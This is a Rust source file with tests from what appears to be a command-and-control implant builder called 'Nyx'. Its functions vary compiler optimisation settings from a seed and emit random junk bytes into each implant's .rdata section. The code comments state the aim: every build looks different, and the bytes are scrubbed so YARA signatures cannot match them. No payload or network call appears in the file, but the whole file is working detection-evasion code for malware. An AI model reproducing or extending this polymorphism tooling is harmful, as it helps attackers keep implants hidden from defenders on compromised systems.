//! Template-side polymorphism helpers driven by `NYX_BUILD_SEED`.
//!
//! L1 maps a seed onto Cargo *release* profile env vars (`opt-level`,
//! `codegen-units`). L3 fills a non-executable `.rdata` blob. Neither path
//! ever selects fat LTO: `CARGO_PROFILE_RELEASE_LTO=fat` swallowed
//! `.nyx_cfg` patches (commit b94a158) and produced dead implants that C2'd
//! to 127.0.0.1. This mapper does not emit an LTO variable at all.
//!
//! Generation stays on the precompiled-template build (`scripts/win_build.sh`
//! + implant `build.rs`). `generate-implant` must not `cargo build`.

use alloc::format;
use alloc::string::String;
use alloc::vec::Vec;

/// `CARGO_PROFILE_RELEASE_OPT_LEVEL` values rotated by L1.
pub const L1_OPT_LEVELS: [&str; 3] = ["3", "s", "z"];
/// `CARGO_PROFILE_RELEASE_CODEGEN_UNITS` values rotated by L1.
pub const L1_CODEGEN_UNITS: [u32; 2] = [16, 1];

/// Inclusive lower bound of the L3 rdata blob length.
pub const L3_JUNK_MIN: usize = 256;
/// `l3_junk_len(seed) = L3_JUNK_MIN + (seed % L3_JUNK_SPAN)` → 256..=1023.
pub const L3_JUNK_SPAN: u64 = 768;

/// Empty generated source when `NYX_BUILD_SEED` is unset (default templates).
pub const L3_JUNK_OMITTED_SOURCE: &str =
    "// NYX_BUILD_SEED unset: omit L3 rdata junk (default template stability).\n";

const SPLITMIX64_INC: u64 = 0x9E3779B97F4A7C15;
const SPLITMIX64_M1: u64 = 0xBF58476D1CE4E5D8;
const SPLITMIX64_M2: u64 = 0x94D049BB133111EB;
/// Domain-separate the L3 stream from the raw seed / L1 `%` mapping.
const L3_STREAM_XOR: u64 = 0x4C33_4A55_4E4B_2101;

/// Fail-closed seed parse error. Never a cue to fall back to fat LTO.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PolySeedError {
    msg: String,
}

impl PolySeedError {
    fn new(msg: impl Into<String>) -> Self {
        Self { msg: msg.into() }
    }
}

impl core::fmt::Display for PolySeedError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(&self.msg)
    }
}

#[cfg(feature = "std")]
impl std::error::Error for PolySeedError {}

/// L1 compile-parameter tuple. LTO is intentionally absent.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct L1ReleaseFlags {
    /// `3`, `s`, or `z`.
    pub opt_level: &'static str,
    /// `16` or `1`.
    pub codegen_units: u32,
}

impl L1ReleaseFlags {
    /// `export` lines for `eval "$(scripts/poly_seed.sh …)"`. No LTO line.
    pub fn export_lines(self) -> String {
        format!(
            "export CARGO_PROFILE_RELEASE_OPT_LEVEL={}\nexport CARGO_PROFILE_RELEASE_CODEGEN_UNITS={}\n",
            self.opt_level, self.codegen_units
        )
    }
}

/// Parse `NYX_BUILD_SEED` as a `u64`.
///
/// Accepts decimal, `0x`/`0X`-prefixed hex, or bare hex when the token is not
/// purely decimal. Leading/trailing whitespace is trimmed. Signed values,
/// empty input, non-hex junk, and overflow are `Err` (fail-closed).
pub fn parse_build_seed(raw: &str) -> Result<u64, PolySeedError> {
    let s = raw.trim();
    if s.is_empty() {
        return Err(PolySeedError::new("NYX_BUILD_SEED is empty"));
    }
    if s.starts_with('+') || s.starts_with('-') {
        return Err(PolySeedError::new(
            "NYX_BUILD_SEED must be an unsigned integer",
        ));
    }
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        return parse_hex(hex, s);
    }
    if s.bytes().all(|c| c.is_ascii_digit()) {
        return s
            .parse::<u64>()
            .map_err(|_| PolySeedError::new(format!("NYX_BUILD_SEED overflows u64: {s}")));
    }
    if s.bytes().all(|c| c.is_ascii_hexdigit()) {
        return parse_hex(s, s);
    }
    Err(PolySeedError::new(format!(
        "NYX_BUILD_SEED is invalid: {s}"
    )))
}

fn parse_hex(hex: &str, original: &str) -> Result<u64, PolySeedError> {
    if hex.is_empty() || !hex.bytes().all(|c| c.is_ascii_hexdigit()) {
        return Err(PolySeedError::new(format!(
            "NYX_BUILD_SEED is invalid hex: {original}"
        )));
    }
    u64::from_str_radix(hex, 16)
        .map_err(|_| PolySeedError::new(format!("NYX_BUILD_SEED overflows u64: {original}")))
}

/// Map `seed` onto opt-level × codegen-units. Does not select LTO.
///
/// `% 3` and `% 2` are coprime, so seeds `0..6` cover all six supported tuples.
/// Each new tuple must pass `nyx_selftest_cfgstage` before it is a supported
/// template; this function is the mapping unit test, not a CI build matrix.
pub const fn l1_release_flags(seed: u64) -> L1ReleaseFlags {
    L1ReleaseFlags {
        opt_level: L1_OPT_LEVELS[(seed % 3) as usize],
        codegen_units: L1_CODEGEN_UNITS[(seed % 2) as usize],
    }
}

/// L3 blob length in `L3_JUNK_MIN..=(L3_JUNK_MIN + L3_JUNK_SPAN - 1)`.
pub const fn l3_junk_len(seed: u64) -> usize {
    L3_JUNK_MIN + (seed % L3_JUNK_SPAN) as usize
}

/// Deterministic non-executable junk bytes for `.rdata`.
///
/// Splitmix64-filled; 0x90 / 0xCC bytes are scrambled so the blob cannot
/// collapse into a NOP/INT3 YARA. The blob is data, never called.
pub fn l3_rdata_junk(seed: u64) -> Vec<u8> {
    let len = l3_junk_len(seed);
    let mut out = Vec::with_capacity(len);
    let mut state = seed ^ L3_STREAM_XOR;
    while out.len() < len {
        let word = splitmix64_next(&mut state);
        for b in word.to_le_bytes() {
            if out.len() == len {
                break;
            }
            out.push(scrub_nop_int3(b));
        }
    }
    out
}

/// Rust source for the L3 `#[used]` static, or [`L3_JUNK_OMITTED_SOURCE`].
pub fn l3_junk_rust_source_from_seed_var(raw: Option<&str>) -> Result<String, PolySeedError> {
    match raw {
        None => Ok(String::from(L3_JUNK_OMITTED_SOURCE)),
        Some(s) => {
            let seed = parse_build_seed(s)?;
            Ok(l3_junk_rust_source(seed))
        }
    }
}

/// Emit a private-to-the-include `#[used]` `.rdata` array (pub for LTO keep).
pub fn l3_junk_rust_source(seed: u64) -> String {
    let bytes = l3_rdata_junk(seed);
    let mut src = String::new();
    src.push_str("// Generated from NYX_BUILD_SEED. Non-executable L3 junk; do not call.\n");
    src.push_str("#[used]\n");
    src.push_str("#[allow(dead_code)]\n");
    src.push_str("#[cfg_attr(windows, link_section = \".rdata\")]\n");
    src.push_str(&format!(
        "pub static NYX_POLY_L3_JUNK: [u8; {}] = [\n",
        bytes.len()
    ));
    for (i, b) in bytes.iter().enumerate() {
        if i % 16 == 0 {
            src.push_str("    ");
        }
        src.push_str(&format!("0x{b:02X},"));
        if i % 16 == 15 || i + 1 == bytes.len() {
            src.push('\n');
        } else {
            src.push(' ');
        }
    }
    src.push_str("];\n");
    src
}

fn splitmix64_next(state: &mut u64) -> u64 {
    *state = state.wrapping_add(SPLITMIX64_INC);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(SPLITMIX64_M1);
    z = (z ^ (z >> 27)).wrapping_mul(SPLITMIX64_M2);
    z ^ (z >> 31)
}

fn scrub_nop_int3(b: u8) -> u8 {
    if b == 0x90 || b == 0xCC {
        b ^ 0x5A
    } else {
        b
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;
    use std::process::Command;

    fn poly_seed_sh() -> std::path::PathBuf {
        std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scripts/poly_seed.sh")
    }

    #[test]
    fn seed_zero_is_deterministic() {
        let a = l1_release_flags(0);
        let b = l1_release_flags(0);
        assert_eq!(a, b);
        assert_eq!(a.opt_level, "3");
        assert_eq!(a.codegen_units, 16);
        assert_eq!(l3_rdata_junk(0), l3_rdata_junk(0));
        assert_eq!(parse_build_seed("0").unwrap(), 0);
        assert_eq!(parse_build_seed("0x0").unwrap(), 0);
        assert_eq!(parse_build_seed("  0  ").unwrap(), 0);
    }

    #[test]
    fn two_seeds_produce_different_flag_tuples() {
        let a = l1_release_flags(0);
        let b = l1_release_flags(1);
        assert_ne!(a, b, "seeds 0 and 1 must not collapse to one tuple");
        assert_ne!(a.export_lines(), b.export_lines());
    }

    #[test]
    fn six_coprime_seeds_cover_all_supported_tuples() {
        let set: HashSet<_> = (0u64..6).map(l1_release_flags).collect();
        assert_eq!(set.len(), 6, "seed%3 × seed%2 must cover all 6 combos");
        for flags in &set {
            assert!(L1_OPT_LEVELS.contains(&flags.opt_level));
            assert!(L1_CODEGEN_UNITS.contains(&flags.codegen_units));
        }
    }

    #[test]
    fn export_lines_never_set_lto() {
        for seed in [0u64, 1, 2, 3, 4, 5, 42, u64::MAX] {
            let lines = l1_release_flags(seed).export_lines();
            let lower = lines.to_ascii_lowercase();
            assert!(!lower.contains("lto"), "mapper must not emit LTO: {lines}");
            assert!(
                !lower.contains("fat"),
                "mapper must not mention fat LTO: {lines}"
            );
            assert!(lines.contains("CARGO_PROFILE_RELEASE_OPT_LEVEL="));
            assert!(lines.contains("CARGO_PROFILE_RELEASE_CODEGEN_UNITS="));
        }
    }

    #[test]
    fn invalid_seed_is_fail_closed() {
        for raw in [
            "",
            "   ",
            "-1",
            "+1",
            "0x",
            "0xzz",
            "xyzzy",
            "fat",
            "lto=fat",
            "18446744073709551616",
            "0x10000000000000000",
        ] {
            assert!(
                parse_build_seed(raw).is_err(),
                "expected Err for {raw:?}, must not fall back"
            );
        }
    }

    #[test]
    fn hex_and_decimal_parse() {
        assert_eq!(parse_build_seed("42").unwrap(), 42);
        assert_eq!(parse_build_seed("0x10").unwrap(), 16);
        assert_eq!(parse_build_seed("0X10").unwrap(), 16);
        assert_eq!(parse_build_seed("ff").unwrap(), 255);
        assert_eq!(
            parse_build_seed("10").unwrap(),
            10,
            "pure digits are decimal"
        );
        assert_eq!(parse_build_seed("0xffffffffffffffff").unwrap(), u64::MAX);
        assert_eq!(parse_build_seed("18446744073709551615").unwrap(), u64::MAX);
    }

    #[test]
    fn l3_junk_is_deterministic_and_not_a_nop_sled() {
        let a = l3_rdata_junk(0);
        let b = l3_rdata_junk(1);
        assert_eq!(a.len(), l3_junk_len(0));
        assert_ne!(a, b);
        assert!(a.iter().any(|&x| x != 0), "seed 0 must not be all-zero");
        for blob in [&a, &b] {
            assert!(blob.len() >= L3_JUNK_MIN);
            assert!(blob.len() < L3_JUNK_MIN + L3_JUNK_SPAN as usize);
            assert!(
                !blob
                    .windows(8)
                    .any(|w| w.iter().all(|&x| x == 0x90) || w.iter().all(|&x| x == 0xCC)),
                "must not be a repeating 0x90/0xCC template"
            );
            assert!(!blob.contains(&0x90));
            assert!(!blob.contains(&0xCC));
        }
    }

    #[test]
    fn l3_source_is_rdata_used_static_not_executable() {
        let omitted = l3_junk_rust_source_from_seed_var(None).unwrap();
        assert_eq!(omitted, L3_JUNK_OMITTED_SOURCE);
        assert!(!omitted.contains("static"));
        assert!(!omitted.contains("fn "));

        let src = l3_junk_rust_source_from_seed_var(Some("0")).unwrap();
        assert!(src.contains("#[used]"));
        assert!(src.contains("link_section = \".rdata\""));
        assert!(src.contains("pub static NYX_POLY_L3_JUNK"));
        assert!(!src.contains(".text"));
        assert!(!src.contains("fn "));
        assert!(!src.to_ascii_lowercase().contains("lto"));
        assert!(l3_junk_rust_source_from_seed_var(Some("nope")).is_err());
        assert!(l3_junk_rust_source_from_seed_var(Some("")).is_err());
    }

    // `poly_seed.sh` is a Unix template-build helper (`win_build.sh` on the
    // macOS/Linux cross host). Windows CI has no `python3` on PATH for Git
    // bash, so these two tests are unix-only; the rust mapper is still
    // covered on every host by the other poly tests.
    #[cfg(unix)]
    #[test]
    fn poly_seed_sh_matches_rust_mapper() {
        let script = poly_seed_sh();
        assert!(script.is_file(), "missing {}", script.display());
        for seed in ["0", "1", "2", "3", "4", "5", "42", "0x10", "0xdeadbeef"] {
            let out = Command::new("bash")
                .arg(&script)
                .arg(seed)
                .output()
                .unwrap_or_else(|e| panic!("spawn poly_seed.sh: {e}"));
            assert!(
                out.status.success(),
                "poly_seed.sh {seed} failed: {}",
                String::from_utf8_lossy(&out.stderr)
            );
            let stdout = String::from_utf8(out.stdout).unwrap();
            let expected = l1_release_flags(parse_build_seed(seed).unwrap()).export_lines();
            assert_eq!(stdout, expected, "script/rust mismatch for seed {seed}");
            assert!(!stdout.to_ascii_lowercase().contains("lto"));
        }
    }

    #[cfg(unix)]
    #[test]
    fn poly_seed_sh_invalid_is_fail_closed() {
        let script = poly_seed_sh();
        for seed in ["", "-1", "nope", "0x", "fat", "18446744073709551616"] {
            let out = Command::new("bash")
                .arg(&script)
                .arg(seed)
                .output()
                .unwrap_or_else(|e| panic!("spawn poly_seed.sh: {e}"));
            assert!(
                !out.status.success(),
                "poly_seed.sh must fail-closed on {seed:?}, got {:?}",
                out.status
            );
            let stdout = String::from_utf8_lossy(&out.stdout).to_ascii_lowercase();
            assert!(
                !stdout.contains("lto") && !stdout.contains("opt_level"),
                "invalid seed must not export profile flags: {stdout}"
            );
        }
    }
}
